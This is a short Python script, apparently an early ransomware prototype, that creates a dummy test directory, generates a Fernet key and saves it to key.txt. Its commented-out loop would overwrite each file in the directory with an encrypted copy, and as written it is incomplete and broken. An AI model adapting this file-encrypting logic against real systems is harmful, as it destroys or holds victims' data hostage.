#!/usr/bin/env python3

# Import
import os
from package             import testdirs
from cryptography.fernet import Fernet

# Variables
cwd = os.getcwd()
main_dir = "test"
rootdir = os.path.join(cwd, main_dir)

# Dummy files
testdirs.tree_structure()

# Fernet: Keygen
def keygen():
    key = Fernet.generate_key()
    with open("key.txt", "wb") as keyfile:
        keyfile.write(key)

# Crypt
#for file in (os.listdir(rootdir)):
#    if file == "ransomware.py" or file == "key.txt":
#        continue
#    if os.path.isfile(file):
#        with open(file, "rb") as thefile:
#            contents = thefile.read()
#        contents_encrypted = Fernet(key).encrypt(contents)
#        with open(file, "wb") as thefile:
#            thefile.write(contents_encrypted)

if __name__ == "__main__":
    keygen()